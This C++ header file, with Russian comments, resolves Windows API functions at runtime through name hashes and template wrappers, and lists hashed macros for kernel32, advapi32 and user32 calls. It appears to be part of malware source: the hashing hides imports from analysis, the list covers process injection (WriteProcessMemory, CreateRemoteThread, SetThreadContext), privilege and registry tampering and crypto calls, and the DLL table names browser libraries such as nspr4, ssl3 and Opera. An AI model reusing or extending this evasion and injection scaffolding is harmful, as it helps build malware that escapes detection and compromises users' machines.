
#ifndef GetApiH
#define GetApiH
//----------------------------------------------------------------------------
#pragma once
#include <windows.h>


//*******************************************************************
//  InitializeAPI - Функция инициализирует систему для работы с АПИ
//
//  ВАЖНО!!!!!!!
//
//  Перед использованием АПИ в процессе необходимо провести
//  инициализацию
//
//
//*******************************************************************
BOOL InitializeAPI();





enum TDllId
{

	DLL_KERNEL32   = 1,
	DLL_ADVAPI32   = 2,
	DLL_USER32     = 3,
	DLL_WINSOCK    = 4,
	DLL_NTDLL      = 5,
	DLL_WINSTA     = 6,
	DLL_SHELL32    = 7,
	DLL_WININET    = 8,
	DLL_URLMON     = 9,
	DLL_NSPR4      = 10,
	DLL_SSL3       = 11,
	DLL_WINMM      = 12,
	DLL_CABINET    = 13,
	DLL_OPERA      = 14,
	DLL_GDI		   = 15,  /* gdi32.dll */
	DLL_GDIPLUS	   = 16,  /* gdiplus.dll */
	DLL_CRYPT32	   = 17,  /* crypt32.dll */
	DLL_PSAPI	   = 18,  /* psapi.dll */
	DLL_SHLWAPI	   = 19,  /* shlwapi.dll */
	DLL_IPHLPAPI   = 20,  /* Iphlpapi.dll */
	DLL_WINSPOOL   = 21,  /* winspool_drv* */
	DLL_COMANDLG32 = 22,  /* commdlg32_dll */
	DLL_ODBC32	   = 23,  /* odbc32_dll */
	DLL_VERSION    = 24,  /* version.dll */
	DLL_OLE32      = 25   /* ole32.dll */
};


//---------------------------------------------------------------------
//  GetDLLName -  Функция возвращает имя библиотеки
//---------------------------------------------------------------------
PCHAR GetDLLName(TDllId ID);

DWORD GetImageBase();


LPVOID GetApiAddr( HMODULE hModule, DWORD dwProcNameHash );
HMODULE GetDllBase( DWORD dwDllHash );
HMODULE GetKernel32();

#define RVATOVA( base, offset ) ( (DWORD)base + (DWORD)offset )

LPVOID GetProcAddressEx( char *Dll, DWORD dwModule, DWORD dwProcNameHash);
LPVOID GetProcAddressEx2( char *Dll, DWORD dwModule, DWORD dwProcNameHash, int CacheIndex);

DWORD pGetLastError();


template <DWORD h, DWORD hash, int Index>
inline LPVOID pushargEx()
{
	typedef LPVOID (WINAPI *newfunc)();
	newfunc func = (newfunc)GetProcAddressEx2(NULL, h, hash, Index );
	return func();
}

template <DWORD h, DWORD hash, int Index, class A>
inline LPVOID pushargEx(A a1)
{	
	typedef LPVOID (WINAPI *newfunc)(A);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, Index );
	return func(a1);
}

template <DWORD h, DWORD hash, int Index, class A, class B>
inline LPVOID pushargEx(A a1,  B a2)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, Index );
	return func(a1,a2);
}

template <DWORD h, DWORD hash, int Index, class A, class B, class C>
inline LPVOID pushargEx(A a1,  B a2, C a3)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, Index );
	return func(a1,a2,a3);
}

template <DWORD h, DWORD hash, int Index, class A, class B, class C, class D>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, Index );
	return func(a1,a2,a3,a4);
}

template <DWORD h, DWORD hash, int Index, class A, class B, class C, class D, class E>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, Index );
	return func(a1, a2, a3, a4, a5);
}

template <DWORD h, DWORD hash, int Index, class A, class B, class C, class D, class E, class F>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, Index );
	return func(a1, a2, a3, a4, a5, a6);
}

template <DWORD h, DWORD hash, int Index, class A, class B, class C, class D, class E, class F, class G>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, Index );
	return func(a1, a2, a3, a4, a5, a6, a7);
}

template <DWORD h, DWORD hash, int Index, class A, class B, class C, class D, class E, class F, class G, class H>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, Index );
	return func(a1, a2, a3, a4, a5, a6, a7, a8);
}

template <DWORD h, DWORD hash, int Index, class A, class B, class C, class D, class E, class F, class G, class H, class I>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, Index );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9);
}

template <DWORD h, DWORD hash, int Index, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, Index );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);
}

template <DWORD h, DWORD hash, int Index, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11 )
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, Index );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}

template <DWORD h, DWORD hash, int Index, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y, class Z, class R>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11, Z a12, R a13)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y, Z, R);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, Index );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13);
}

template <DWORD h, DWORD hash, int Index, class A1, class A2, class A3, class A4, class A5,
	class A6, class A7, class A8, class A9, class A10, class A11, class A12>
inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
						A9 a9, A10 a10, A11 a11, A12 a12)
{	
	typedef LPVOID (WINAPI *newfunc)(A1, A2, A3, A4, A5, A6, A7, A8, A9, A10,
									A11, A12);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, Index );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12);
}



// Размер кэша апи
const static int ApiCacheSize = 522;  // НЕ ПЕРЕИМЕНОВЫВАТЬ!!!




//kernel32
#define pLoadLibraryA 				pushargEx< DLL_KERNEL32, 0xC8AC8026, 1 >
#define pLoadLibraryW 				pushargEx< DLL_KERNEL32, 0xC8AC8030, 2 >
#define pLoadLibraryExA 			pushargEx< DLL_KERNEL32, 0x20088E6A, 3 >
#define pLoadLibraryExW 			pushargEx< DLL_KERNEL32, 0x20088E7C, 4 >
#define pFreeLibrary 				pushargEx< DLL_KERNEL32, 0x4B935B8E, 5 >
#define pGetProcAddress 			pushargEx< DLL_KERNEL32, 0x1FC0EAEE, 6 >
#define pTerminateProcess			pushargEx< DLL_KERNEL32, 0x9E6FA842, 7 >
#define pVirtualAlloc 				pushargEx< DLL_KERNEL32, 0x697A6AFE, 8 >
#define pVirtualAllocEx 			pushargEx< DLL_KERNEL32, 0x9ABFB8A6, 9 >
#define pVirtualFree 				pushargEx< DLL_KERNEL32, 0x3A35705F, 10 >
#define pVirtualFreeEx 				pushargEx< DLL_KERNEL32, 0x5C17EC75, 11 >
#define pVirtualQuery 				pushargEx< DLL_KERNEL32, 0x6A582465, 12 >
#define pVirtualQueryEx 			pushargEx< DLL_KERNEL32, 0x919786E, 13 >
#define pVirtualProtect 			pushargEx< DLL_KERNEL32, 0xA9DE6F5A, 14 >
#define pVirtualProtectEx 			pushargEx< DLL_KERNEL32, 0x9BD6888F, 15 >
#define pCloseHandle 				pushargEx< DLL_KERNEL32, 0x723EB0D5, 16 >
#define pGlobalAlloc 				pushargEx< DLL_KERNEL32, 0x725EA171, 17 >
#define pGlobalFree 				pushargEx< DLL_KERNEL32, 0x240339C8, 18 >
#define pCreateFileA 				pushargEx< DLL_KERNEL32, 0x8F8F114, 19 >
#define pCreateFileW 				pushargEx< DLL_KERNEL32, 0x8F8F102, 20 >
#define pWriteFile 					pushargEx< DLL_KERNEL32, 0xF3FD1C3, 21 >
#define pGetCurrentDirectoryA		pushargEx< DLL_KERNEL32, 0xC80715CE, 22 >
#define pWriteProcessMemory 		pushargEx< DLL_KERNEL32, 0xBEA0BF35, 23 >
#define pCreateRemoteThread 		pushargEx< DLL_KERNEL32, 0xE61874B3, 24 >
#define pReadFile 					pushargEx< DLL_KERNEL32, 0x487FE16B, 25 >
#define pSetFilePointer 			pushargEx< DLL_KERNEL32, 0xEF48E03A, 26 >
#define pSetEndOfFile 				pushargEx< DLL_KERNEL32, 0x2D0D9D61, 27 >
#define pCopyFileA 					pushargEx< DLL_KERNEL32, 0x2EE4F10D, 28 >
#define pCopyFileW 					pushargEx< DLL_KERNEL32, 0x2EE4F11B, 29 >
#define pMoveFileA 					pushargEx< DLL_KERNEL32, 0x20E4E9ED, 30 >
#define pMoveFileW 					pushargEx< DLL_KERNEL32, 0x20E4E9FB, 31 >
#define pMoveFileExA 				pushargEx< DLL_KERNEL32, 0x3A7A7478, 32 >
#define pMoveFileExW 				pushargEx< DLL_KERNEL32, 0x3A7A746E, 33 >
#define pDeleteFileA 				pushargEx< DLL_KERNEL32, 0x81F0F0DF, 34 >
#define pDeleteFileW 				pushargEx< DLL_KERNEL32, 0x81F0F0C9, 35 >
#define pGetFileSize 				pushargEx< DLL_KERNEL32, 0xAEF7CBF1, 36 >
#define pCreateFileMappingA 		pushargEx< DLL_KERNEL32, 0xEF0A25B7, 37 >
#define pCreateFileMappingW 		pushargEx< DLL_KERNEL32, 0xEF0A25A1, 38 >
#define pMapViewOfFile 				pushargEx< DLL_KERNEL32, 0x5CD9430, 39 >
#define pGetFileTime 				pushargEx< DLL_KERNEL32, 0xAE17C071, 40 >
#define pSetFileTime 				pushargEx< DLL_KERNEL32, 0xAE17C571, 41 >
#define pGetModuleHandleA 			pushargEx< DLL_KERNEL32, 0xA48D6762, 42 >
#define pGetModuleHandleW 			pushargEx< DLL_KERNEL32, 0xA48D6774, 43 >
#define pUnmapViewOfFile 			pushargEx< DLL_KERNEL32, 0x77CD9567, 44 >
#define pWaitForSingleObject 		pushargEx< DLL_KERNEL32, 0xC54374F3, 45 >
#define pSleep 						pushargEx< DLL_KERNEL32, 0x3D9972F5, 46 >
#define pWideCharToMultiByte 		pushargEx< DLL_KERNEL32, 0xE74F57EE, 47 >
#define pMultiByteToWideChar 		pushargEx< DLL_KERNEL32, 0x5AA7E70B, 48 >
#define pGetModuleFileNameA 		pushargEx< DLL_KERNEL32, 0x774393E8, 49 >
#define pGetModuleFileNameW 		pushargEx< DLL_KERNEL32, 0x774393FE, 50 >
#define pGetSystemDirectoryA 		pushargEx< DLL_KERNEL32, 0x49A1374A, 51 >
#define pGetSystemDirectoryW 		pushargEx< DLL_KERNEL32, 0x49A1375C, 52 >
#define pGetTempPathA 				pushargEx< DLL_KERNEL32, 0x58FE7ABE, 53 >
#define pGetTempPathW 				pushargEx< DLL_KERNEL32, 0x58FE7AA8, 54 >
#define pGetVolumeInformationA 		pushargEx< DLL_KERNEL32, 0x67ECDE97, 55 >
#define pGetVolumeInformationW 		pushargEx< DLL_KERNEL32, 0x67ECDE81, 56 >
#define pSetFileAttributesA 		pushargEx< DLL_KERNEL32, 0x4D5587B7, 57 >
#define pSetFileAttributesW 		pushargEx< DLL_KERNEL32, 0x4D5587A1, 58 >
#define pCreateProcessA 			pushargEx< DLL_KERNEL32, 0x46318AC7, 59 >
#define pCreateProcessW 			pushargEx< DLL_KERNEL32, 0x46318AD1, 60 >
#define pGetVersionExA 				pushargEx< DLL_KERNEL32, 0x9C480E24, 61 >
#define pGetVersionExW 				pushargEx< DLL_KERNEL32, 0x9C480E32, 62 >
#define pCreateThread 				pushargEx< DLL_KERNEL32, 0x6FB89AF0, 63 >
#define pSetThreadPriority			pushargEx< DLL_KERNEL32, 0xBC262395, 64 >
#define pCreateMutexA 				pushargEx< DLL_KERNEL32, 0xBF78969C, 65 >
#define pCreateMutexW 				pushargEx< DLL_KERNEL32, 0xBF78968A, 66 >
#define pReleaseMutex 				pushargEx< DLL_KERNEL32, 0xBB74A4A2, 67 >
#define pGetVersion 				pushargEx< DLL_KERNEL32, 0xCB932CE2, 68 >
#define pDeviceIoControl 			pushargEx< DLL_KERNEL32, 0x82E8173, 69 >
#define pQueryDosDeviceA 			pushargEx< DLL_KERNEL32, 0xAC81BECB, 70 >
#define pQueryDosDeviceW 			pushargEx< DLL_KERNEL32, 0xAC81BEDD, 71 >
#define pIsBadReadPtr 				pushargEx< DLL_KERNEL32, 0x7D544DBD, 72 >
#define pIsBadWritePtr 				pushargEx< DLL_KERNEL32, 0xAC85818D, 73 >
#define pGetCurrentProcess 			pushargEx< DLL_KERNEL32, 0xD89AD05, 74 >
#define pCreateMutexA 				pushargEx< DLL_KERNEL32, 0xBF78969C, 75 >
#define pCreateMutexW 				pushargEx< DLL_KERNEL32, 0xBF78968A, 76 >
#define pReleaseMutex 				pushargEx< DLL_KERNEL32, 0xBB74A4A2, 77 >
#define pCreateEventW 				pushargEx< DLL_KERNEL32, 0x8D5A50CA, 78 >
#define pSetEvent 					pushargEx< DLL_KERNEL32, 0x5E7EE0D0, 79 >
#define pResetEvent 				pushargEx< DLL_KERNEL32, 0x3B3EE0F9, 80 >
#define pGetShortPathNameA 			pushargEx< DLL_KERNEL32, 0x223296ED, 81 >
#define pGetShortPathNameW 			pushargEx< DLL_KERNEL32, 0x223296FB, 82 >
#define pLocalFree 					pushargEx< DLL_KERNEL32, 0x84033DEB, 83 >
#define pGetPrivateProfileStringA 	pushargEx< DLL_KERNEL32, 0xAA19E291, 84 >
#define pGetPrivateProfileStringW 	pushargEx< DLL_KERNEL32, 0xAA19E287, 85 >
#define pGetFileAttributesA 		pushargEx< DLL_KERNEL32, 0x475587B7, 86 >
#define pGetFileAttributesW 		pushargEx< DLL_KERNEL32, 0x475587A1, 87 >
#define pGetEnvironmentVariableA 	pushargEx< DLL_KERNEL32, 0x9802EF30, 88 >
#define pGetEnvironmentVariableW 	pushargEx< DLL_KERNEL32, 0x9802EF26, 89 >
#define pReadProcessMemory 			pushargEx< DLL_KERNEL32, 0x9D00A761, 90 >
#define pExitProcess 				pushargEx< DLL_KERNEL32, 0x95902B19, 91 >
#define pOpenProcess 				pushargEx< DLL_KERNEL32, 0x99A4299D, 92 >
#define pGetCurrentProcessId		pushargEx< DLL_KERNEL32, 0x6B416786, 93 >
#define pProcess32First 			pushargEx< DLL_KERNEL32, 0x19F78C90, 94 >
#define pProcess32Next 				pushargEx< DLL_KERNEL32, 0xC930EA1E, 95 >
#define pCreateToolhelp32Snapshot	pushargEx< DLL_KERNEL32, 0x5BC1D14F, 96 >
#define pWinExec 					pushargEx< DLL_KERNEL32, 0xE8BF6DAD, 97 >
#define pFindResourceA 				pushargEx< DLL_KERNEL32, 0x8FE060C, 98 >
#define pSetLastError 				pushargEx< DLL_KERNEL32, 0x1295012C, 99 >
#define pLoadResource 				pushargEx< DLL_KERNEL32, 0x1A10BD8B, 100 >
#define pLockResource 				pushargEx< DLL_KERNEL32, 0x1510BD8A, 101 >
#define pSizeofResource 			pushargEx< DLL_KERNEL32, 0x86867F0E, 102 >
#define pLockRsrc 					pushargEx< DLL_KERNEL32, 0xBAC5467D, 103 >
#define pGetTempFileNameA 			pushargEx< DLL_KERNEL32, 0xFA4F502, 104 >
#define pGetTempFileNameW 			pushargEx< DLL_KERNEL32, 0xFA4F514, 105 >
#define pGetLongPathNameA 			pushargEx< DLL_KERNEL32, 0x9835D5A1, 106 >
#define pCreateEventA				pushargEx< DLL_KERNEL32, 0x8D5A50DC, 107 >
#define pConnectNamedPipe			pushargEx< DLL_KERNEL32, 0x7235F00E, 108 >
#define pDisconnectNamedPipe   		pushargEx< DLL_KERNEL32, 0x46C6B01F, 109 >
#define pCreateNamedPipeA			pushargEx< DLL_KERNEL32, 0x42F9BB48, 110 >
#define pGetTickCount				pushargEx< DLL_KERNEL32, 0x69260152, 111 >
#define pExitThread					pushargEx< DLL_KERNEL32, 0x768AA260, 112 >
#define plstrcmpiA					pushargEx< DLL_KERNEL32, 0x515BE757, 113 >
#define pSuspendThread				pushargEx< DLL_KERNEL32, 0xEEBA5EBA, 114 >
#define pGetComputerNameA			pushargEx< DLL_KERNEL32, 0x3DEF91BA, 115 >
#define pGetThreadContext			pushargEx< DLL_KERNEL32, 0xAA1DE02F, 116 >
#define pSetThreadContext			pushargEx< DLL_KERNEL32, 0xAA1DC82F, 117 >
#define pResumeThread				pushargEx< DLL_KERNEL32, 0x7B88BF3B, 118 >
#define pProcessIdToSessionId		pushargEx< DLL_KERNEL32, 0x654F3F9E, 119 >
#define	pWTSGetActiveConsoleSessionId	pushargEx< DLL_KERNEL32, 0x654FEEAC, 120 >
#define pOpenMutexA					pushargEx< DLL_KERNEL32, 0xAE52C609, 121 >
#define pCreateProcessInternalA		pushargEx< DLL_KERNEL32, 0xE24394E4, 122 >
#define pCreateProcessInternalW		pushargEx< DLL_KERNEL32, 0xE24394F2, 123 >
#define pTerminateThread			pushargEx< DLL_KERNEL32, 0xC09D5D66, 124 >
#define plopen						pushargEx< DLL_KERNEL32, 0xCDFC3010, 125 >
#define plstrcmpA					pushargEx< DLL_KERNEL32, 0x2CA2B7E6, 126 >
#define plstrcmpW					pushargEx< DLL_KERNEL32, 0x2CA2B7F0, 127 >
#define plstrcatA					pushargEx< DLL_KERNEL32, 0x2CA1B5E6, 128 >
#define plstrcatW					pushargEx< DLL_KERNEL32, 0x2CA1B5F0, 129 >
#define plstrcpyA					pushargEx< DLL_KERNEL32, 0x2CA5F366, 130 >
#define plstrcpyW					pushargEx< DLL_KERNEL32, 0x2CA5F370, 131 >
#define plstrlenA					pushargEx< DLL_KERNEL32, 0x2D40B8E6, 132 >
#define plstrlenW					pushargEx< DLL_KERNEL32, 0x2D40B8F0, 133 >
#define pThread32First				pushargEx< DLL_KERNEL32, 0x89B968D2, 134 >
#define pThread32Next				pushargEx< DLL_KERNEL32, 0x4C1077D6, 135 >
#define pOpenThread					pushargEx< DLL_KERNEL32, 0x7E92CA65, 136 >
#define pGetWindowsDirectoryA		pushargEx< DLL_KERNEL32, 0x78B00C7E, 137 >
#define pGetWindowsDirectoryW		pushargEx< DLL_KERNEL32, 0x78B00C68, 138 >
#define pFindFirstFileA				pushargEx< DLL_KERNEL32, 0x32432444, 139 >
#define pFindFirstFileW				pushargEx< DLL_KERNEL32, 0x32432452, 140 >
#define pFindNextFileA				pushargEx< DLL_KERNEL32, 0x279DEAD7, 141 >
#define pFindNextFileW				pushargEx< DLL_KERNEL32, 0x279DEAC1, 142 >
#define pFindClose  				pushargEx< DLL_KERNEL32, 0x7B4842C1, 143 >
#define pRemoveDirectoryA			pushargEx< DLL_KERNEL32, 0x4AE7572B, 144 >
#define pInitializeCriticalSection	pushargEx< DLL_KERNEL32, 0xDA81BC58, 145 >
#define pEnterCriticalSection		pushargEx< DLL_KERNEL32, 0xF3B84F05, 146 >
#define pLeaveCriticalSection		pushargEx< DLL_KERNEL32, 0x392B6027, 147 >
#define pDeleteCriticalSection		pushargEx< DLL_KERNEL32, 0x7B2D2505, 148 >
#define pGetProcessHeap				pushargEx< DLL_KERNEL32, 0x68807354, 149 >
#define pHeapAlloc					pushargEx< DLL_KERNEL32, 0x5550B067, 150 >
#define pHeapReAlloc				pushargEx< DLL_KERNEL32, 0xFC7A6EFD, 151 >
#define pHeapSize					pushargEx< DLL_KERNEL32, 0x0AEBEA6A, 152 >
#define pHeapFree					pushargEx< DLL_KERNEL32, 0x084D25EA, 153 >
#define pGetCurrentThreadId			pushargEx< DLL_KERNEL32, 0xA45B370A, 154 >
#define pGetCurrentThread   		pushargEx< DLL_KERNEL32, 0x4FBA916C, 155 >
#define	pGlobalLock					pushargEx< DLL_KERNEL32, 0x25447AC6, 156 >
#define	pGlobalUnlock				pushargEx< DLL_KERNEL32, 0xF50B872, 157 >
#define pSetErrorMode				pushargEx< DLL_KERNEL32, 0x6C544060, 158 >
#define pGetFileInformationByHandle pushargEx< DLL_KERNEL32, 0xF149BCC4, 159 >
#define pFileTimeToLocalFileTime	pushargEx< DLL_KERNEL32, 0xE5792E94, 160 >
#define pFileTimeToDosDateTime		pushargEx< DLL_KERNEL32, 0xB68EBEF8, 161 >
#define pOutputDebugStringA			pushargEx< DLL_KERNEL32, 0xD0498CD4, 162 >
#define pExpandEnvironmentStringsA	pushargEx< DLL_KERNEL32, 0x23EBE98B, 163 >
#define pExpandEnvironmentStringsW	pushargEx< DLL_KERNEL32, 0x23EBE99D, 164 >
#define pOutputDebugStringW			pushargEx< DLL_KERNEL32, 0xD0498CC2, 165 >
#define pLocalAlloc 				pushargEx< DLL_KERNEL32, 0x725CB0A1, 166 >
#define pFindFirstChangeNotificationA pushargEx< DLL_KERNEL32, 0xE8402F0, 167 >
#define pFindCloseChangeNotification  pushargEx< DLL_KERNEL32, 0x3634D801, 168 >
#define pFindNextChangeNotification   pushargEx< DLL_KERNEL32, 0xFAB3FE71, 169 >
#define pCreateDirectoryW			  pushargEx< DLL_KERNEL32, 0xA073561, 170 >
#define pCreateDirectoryA		    pushargEx< DLL_KERNEL32, 0xA073577, 171 >
#define pOpenEventW					pushargEx< DLL_KERNEL32, 0x9C70005F, 172 >
#define pGetSystemTimeAsFileTime	pushargEx< DLL_KERNEL32, 0x6951E92A, 173 >
#define pGetSystemTime 				pushargEx< DLL_KERNEL32, 0x270118E2, 174 >
#define pFileTimeToSystemTime		pushargEx< DLL_KERNEL32, 0x3B429F5F, 175 >
#define pCompareFileTime			pushargEx< DLL_KERNEL32, 0x41C9C8F5, 176 >
#define pSystemTimeToFileTime		pushargEx< DLL_KERNEL32, 0xEA7EA921, 177 >
#define pGetLogicalDriveStringsA  	pushargEx< DLL_KERNEL32, 0x70F6FE31, 178 >
#define pGetDriveTypeA          	pushargEx< DLL_KERNEL32, 0x399354CE, 179 >
#define pSleepEx				 	pushargEx< DLL_KERNEL32, 0x5CBD6D9E, 180 >
#define pGetProcessId				pushargEx< DLL_KERNEL32, 0x0e91a280, 181 >
#define pOpenEventA					pushargEx< DLL_KERNEL32, 0x9C700049, 182 >
#define pSetCurrentDirectoryW		pushargEx< DLL_KERNEL32, 0xc8071758, 183 >
#define pSetCurrentDirectoryA		pushargEx< DLL_KERNEL32, 0xc807174e, 184 >
#define pDuplicateHandle			pushargEx< DLL_KERNEL32, 0x533d3b41, 185 >
#define pGetExitCodeThread			pushargEx< DLL_KERNEL32, 0x4E5A10B1, 186 >
#define pGetCommandLineA			pushargEx< DLL_KERNEL32, 0xFB0730C, 187 >
#define pGetPrivateProfileIntA		pushargEx< DLL_KERNEL32, 0x11CC0678, 188 >
#define pGetPrivateProfileStringA	pushargEx< DLL_KERNEL32, 0xAA19E291, 189 >
#define pProcess32FirstW 			pushargEx< DLL_KERNEL32, 0xFBC6485B, 190 >
#define pProcess32NextW				pushargEx< DLL_KERNEL32, 0x98750F33, 191 >
#define pGetLogicalDrives			pushargEx< DLL_KERNEL32, 0x6A3376B7, 192 >
#define pGetDriveTypeA				pushargEx< DLL_KERNEL32, 0x399354CE, 193 >
#define pInterlockedIncrement		pushargEx< DLL_KERNEL32, 0xD03C6D18, 194 >
#define pInterlockedDecrement		pushargEx< DLL_KERNEL32, 0xDD2A6D18, 195 >

//advapi32
#define pCreateProcessAsUserA		pushargEx< DLL_ADVAPI32, 0x985267C4, 196 >
#define pSetThreadToken				pushargEx< DLL_ADVAPI32, 0xA16FE0FD, 197 >
#define pOpenProcessToken 			pushargEx< DLL_ADVAPI32, 0x80DBBE07, 198 >
#define pLookupPrivilegeValueA 		pushargEx< DLL_ADVAPI32, 0x1B3D12B9, 199 >
#define pLookupPrivilegeValueW 		pushargEx< DLL_ADVAPI32, 0x1B3D12AF, 200 >
#define pAdjustTokenPrivileges 		pushargEx< DLL_ADVAPI32, 0x7A2167DC, 201 >
#define pRegOpenKeyExA 				pushargEx< DLL_ADVAPI32, 0xAAD67FF8, 202 >
#define pRegOpenKeyExW 				pushargEx< DLL_ADVAPI32, 0xAAD67FEE, 203 >
#define pRegQueryInfoKeyA 			pushargEx< DLL_ADVAPI32, 0xBDF4DB19, 204 >
#define pRegQueryInfoKeyW 			pushargEx< DLL_ADVAPI32, 0xBDF4DB0F, 205 >
#define pRegEnumKeyExA 				pushargEx< DLL_ADVAPI32, 0xB4F673FD, 206 >
#define pRegEnumKeyExW 				pushargEx< DLL_ADVAPI32, 0xB4F673EB, 207 >
#define pRegEnumValueA 				pushargEx< DLL_ADVAPI32, 0xF65A7D95, 208 >
#define pRegEnumValueW 				pushargEx< DLL_ADVAPI32, 0xF65A7D83, 209 >
#define pRegQueryValueExA 			pushargEx< DLL_ADVAPI32, 0x1802E7C8, 210 >
#define pRegQueryValueExW 			pushargEx< DLL_ADVAPI32, 0x1802E7DE, 211 >
#define pRegCloseKey 				pushargEx< DLL_ADVAPI32, 0xDB355534, 212 >
#define pRegDeleteKeyA 				pushargEx< DLL_ADVAPI32, 0x398C5285, 213 >
#define pRegDeleteKeyW 				pushargEx< DLL_ADVAPI32, 0x398C5293, 214 >
#define pRegSetValueExA 			pushargEx< DLL_ADVAPI32, 0x3E400FD6, 215 >
#define pRegSetValueExW 			pushargEx< DLL_ADVAPI32, 0x3E400FC0, 216 >
#define pGetUserNameA 				pushargEx< DLL_ADVAPI32, 0xB9D41C2F, 217 >
#define pGetUserNameW 				pushargEx< DLL_ADVAPI32, 0xB9D41C39, 218 >
#define pOpenServiceA 				pushargEx< DLL_ADVAPI32, 0x83969964, 219 >
#define pStartServiceA 				pushargEx< DLL_ADVAPI32, 0x1CA1FD2F, 220 >
#define pGetKernelObjectSecurity 	pushargEx< DLL_ADVAPI32, 0xB29136DD, 221 >
#define pOpenSCManagerA 			pushargEx< DLL_ADVAPI32, 0xA06E459C, 222 >
#define pGetCurrentHwProfileA		pushargEx< DLL_ADVAPI32, 0xF684C7A9, 223 >
#define pGetTokenInformation		pushargEx< DLL_ADVAPI32, 0xD4ECC759, 224 >
#define pInitializeSecurityDescriptor	pushargEx< DLL_ADVAPI32, 0xB8538A52, 225 >
#define pSetSecurityDescriptorOwner	pushargEx< DLL_ADVAPI32, 0xDADD5994, 226 >
#define pSetSecurityDescriptorDacl	pushargEx< DLL_ADVAPI32,0xCCD03C3A, 227 >
#define pSetFileSecurityW			pushargEx< DLL_ADVAPI32, 0x5A9B2FDD, 228 >
#define pRegCreateKeyW				pushargEx< DLL_ADVAPI32, 0xAE9E4290, 229 >
#define pRegCreateKeyA				pushargEx< DLL_ADVAPI32, 0xAE9E4286, 230 >
#define pRegCreateKeyExW			pushargEx< DLL_ADVAPI32, 0x90A097F0, 231 >
#define pRegCreateKeyExA			pushargEx< DLL_ADVAPI32, 0x90A097E6, 232 >
#define pRegSaveKeyA				pushargEx< DLL_ADVAPI32, 0xBEDEEFC5, 233 >
#define pRegSaveKeyW				pushargEx< DLL_ADVAPI32, 0xBEDEEFD3, 234 >
#define pRegSaveKeyExA				pushargEx< DLL_ADVAPI32, 0xBBF053F6, 235 >
#define pRegSaveKeyExW				pushargEx< DLL_ADVAPI32, 0xBBF053E0, 236 >
#define pCryptAcquireContextA		pushargEx< DLL_ADVAPI32, 0x8AD7DE34, 237 >
#define pCryptReleaseContext		pushargEx< DLL_ADVAPI32, 0x72760BB8, 238 >
#define pCryptImportKey     		pushargEx< DLL_ADVAPI32, 0x78660DBE, 239 >
#define pCryptEncrypt    	    	pushargEx< DLL_ADVAPI32, 0xCEBF13BE, 240 >
#define pCryptDecrypt    	    	pushargEx< DLL_ADVAPI32, 0xCEBF17E6, 241 >
#define pCryptSetKeyParam   		pushargEx< DLL_ADVAPI32, 0x37A53419, 242 >
#define pCryptDestroyKey    		pushargEx< DLL_ADVAPI32, 0xD4B3D42, 243 >

//user32
#define pExitWindowsEx 				pushargEx< DLL_USER32, 0xAD7043A4, 244 >
#define pPeekMessageW 				pushargEx< DLL_USER32, 0xD7A87C3A, 245 >
#define pDispatchMessageW 			pushargEx< DLL_USER32, 0x4BAED1DE, 246 >
#define pMsgWaitForMultipleObjects 	pushargEx< DLL_USER32, 0xD36CEAF0, 247 >
#define pWaitForInputIdle			pushargEx< DLL_USER32, 0x4FAC81B4, 248 >
#define pGetWindowThreadProcessId	pushargEx< DLL_USER32, 0x6C7F716F, 249 >
#define pFindWindowA				pushargEx< DLL_USER32, 0x252B53B, 250 >
#define pGetSystemMetrics			pushargEx< DLL_USER32, 0x8EBEF5B1, 251 >
#define pGetActiveWindow			pushargEx< DLL_USER32, 0xDB7C98AC, 252 >
